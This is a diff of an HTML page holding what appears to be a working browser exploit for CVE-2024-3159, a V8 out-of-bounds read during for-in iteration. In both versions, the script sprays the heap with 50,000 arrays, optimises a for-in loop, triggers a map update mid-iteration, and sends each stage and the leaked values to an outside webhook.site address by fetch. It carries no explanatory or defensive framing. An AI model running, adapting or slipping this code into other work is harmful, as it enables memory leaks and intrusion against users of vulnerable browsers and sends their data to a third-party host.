@@ -1,36 +1,32 @@
-<html><body>
-<pre id="log"></pre>
-<script>
-function beacon(t, v){
-  try { fetch('https://webhook.site/a8279697-7086-4e2d-a57e-0e328d1b3168/?t='+t+'&v='+encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
+<html><body><script>
+const SINK = 'https://webhook.site/c7b10235-199e-45d3-89bd-2f53b4ecab6d/?';
+function beacon(t, v) {
+  try { fetch(SINK + 't=' + t + '&v=' + encodeURIComponent(String(v).slice(0,200)), {mode:'no-cors'}); } catch(e) {}
 }
 
-let log = document.getElementById('log');
-function l(s) { log.textContent += s + '\n'; }
+beacon('start', '3159-spray');
 
-beacon('3159-start', '');
+// === CVE-2024-3159: V8 enum cache OOB after map update during for-in ===
+// OOB reads 1 tagged word past FixedArray[0]
+// Sprays arrays to control what that word points to
 
-// CVE-2024-3159: V8 enum cache OOB after map update during for-in
-// OOB reads tagged word after FixedArray[0]
-
-// === STAGE 1: Spray heap with known arrays ===
+// --- HEAP SPRAY ---
 let spray = [];
 for (let i = 0; i < 50000; i++) {
   spray.push([i * 7 + 13, i * 13 + 7]);
 }
-beacon('spray-done', '50k arrays');
+beacon('spray', '50k');
 
-// === STAGE 2: Setup 3159 trigger ===
+// --- 3159 TRIGGER SETUP ---
 const object1 = {}; object1.a = 1;
 const object2 = {}; object2.a = 1; object2.b = 1;
 const object3 = {}; object3.a = 1; object3.b = 1; object3.c = 1;
 Object.defineProperty(object3, "d", {writable: false, enumerable: true, value: 1});
 const object4 = {}; object4.a = 1; object4.b = 1; object4.c = 1; object4.d = 1;
-
-for (let key in object3) { }  // warm object3's enum cache
+for (let key in object3) { }
 delete object3.d;
 
-// Warm the for-in loop to get it optimized
+// Warm for-in
 let escape;
 function trigger(cb) {
   for (let key in object2) {
@@ -38,31 +34,23 @@ function trigger(cb) {
     escape = object2[key];
   }
 }
-for (let i = 0; i < 30000; i++) {
-  trigger(_ => {});
-}
-beacon('warm-done', '');
+for (let i = 0; i < 30000; i++) trigger(_ => {});
+beacon('warm', '30k');
 
-// Fire: map update during iteration -> OOB read
+// Fire: map update during iteration -> OOB read of tagged word
 trigger(function () {
   object4.c = 1.1;
   for (let key in object1) { }
 });
 
-l('escape=' + typeof escape + ' val=' + escape);
 beacon('escape', typeof escape + ':' + escape);
 
-// If escape is an array, we have a controlled read primitive
+// Check if we got an array (info leak) or just a number
 if (Array.isArray(escape)) {
-  l('GOT ARRAY: ' + JSON.stringify(escape));
-  beacon('oob-array', JSON.stringify(escape).slice(0,200));
-} else if (typeof escape === 'number') {
-  // escape should be 1 or 2 (SMI), but if we got an unexpected value -> info leak
-  l('escape value: ' + escape);
-  beacon('escape-value', String(escape));
+  beacon('leak-array', JSON.stringify(escape).slice(0,200));
+} else {
+  beacon('leak-value', String(escape));
 }
 
-beacon('3159-done', '');
-l('DONE');
-</script>
-</body></html>
+beacon('done', '3159');
+</script></body></html>
